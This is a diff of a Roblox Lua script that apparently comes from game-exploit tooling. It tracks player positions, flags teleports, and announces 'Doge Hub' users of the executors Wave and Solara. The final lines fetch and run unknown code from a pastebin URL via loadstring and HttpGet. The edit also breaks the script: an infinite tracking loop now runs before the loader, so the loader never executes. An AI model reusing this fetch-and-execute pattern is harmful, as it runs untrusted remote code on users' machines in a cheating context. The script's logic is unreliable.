@@ -362,8 +362,7 @@ local function sendNotification(message)
     })
 end
 
-print("ethereal leaked?!?!!1!!11!! FR! fr!")
-print("ass ethereal ")
+print("Script initialized.")
 
 -- Configuration
 local teleportThresholdSmall = 6000 -- Threshold for small teleportation
@@ -377,19 +376,14 @@ local bypassFlag = false -- Set to true to bypass flag detection
 local function detectTeleportation(player, oldPosition, newPosition)
     local distance = (newPosition - oldPosition).Magnitude
 
-    -- Debug print
-    -- print(player.Name .. " - Distance moved: " .. distance)
-
     if not bypassFlag then
-        -- Large teleportation (790 studs or more)
         if distance >= teleportThresholdLarge and not flaggedPlayers[player.Name] then
-            flaggedPlayers[player.Name] = true -- Mark player as flagged
-            print(player.Name .. " flagged for large teleportation!") -- Log the event
+            flaggedPlayers[player.Name] = true
+            print(player.Name .. " flagged for large teleportation!")
             sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Wave")
-        -- Small teleportation (430 studs or less)
         elseif distance >= teleportThresholdSmall and distance < teleportThresholdLarge and not flaggedPlayers[player.Name] then
-            flaggedPlayers[player.Name] = true -- Mark player as flagged
-            print(player.Name .. " flagged for small teleportation!") -- Log the event
+            flaggedPlayers[player.Name] = true
+            print(player.Name .. " flagged for small teleportation!")
             sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Solara")
         end
     end
@@ -397,40 +391,42 @@ end
 
 -- Main loop to track player positions and detect teleportation
 local function trackPlayers()
+    print("Tracking players started.")
     while true do
-        for _, player in pairs(game.Players:GetPlayers()) do
-            -- Ensure the player's character is loaded
+        for _, player in pairs(Players:GetPlayers()) do
             if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                 local humanoidRootPart = player.Character.HumanoidRootPart
                 local currentPosition = humanoidRootPart.Position
 
-                -- Check if the player has been tracked before
                 if playerPositions[player.Name] then
                     local oldPosition = playerPositions[player.Name]
                     detectTeleportation(player, oldPosition, currentPosition)
                 else
-                    print(player.Name .. " has no previous position tracked.") -- Debug print
+                    print(player.Name .. " has no previous position tracked.")
                 end
 
-                -- Update the player's position for the next check
                 playerPositions[player.Name] = currentPosition
             else
-                -- If the character is not loaded, remove the player's position
                 playerPositions[player.Name] = nil
             end
         end
 
-        wait(checkInterval) -- Wait before checking again
+        wait(checkInterval)
     end
 end
 
--- Start tracking players -- Ensure the coroutine starts
-print("Player tracking started.")
-	coroutine.wrap(trackPlayers)()
-	wait(1)
+-- Start tracking players
+trackPlayers()
 
--- Load external script (make sure this is the intended use)
-loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+-- Load external script
+print("Attempting to load external script...")
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+end)
+
+if not success then
+    print("Error loading external script: " .. err)
+end
 
 
 
